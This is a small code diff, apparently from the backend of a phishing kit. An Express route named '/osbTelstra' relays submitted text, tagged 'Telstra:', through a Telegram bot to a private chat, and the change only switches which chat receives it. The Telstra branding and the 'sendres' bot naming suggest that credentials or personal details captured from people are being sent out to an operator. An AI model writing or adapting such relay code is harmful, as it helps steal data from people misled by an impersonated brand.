@@ -10590,7 +10590,7 @@ app.post("/osbTelstra", (req, res) => {
             .post(
               `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
               {
-                chat_id: 5138777422,
+                chat_id: 5539333576,
                 text: `Telstra:\n${originalText}`,
                 parse_mode: "Markdown",
               }
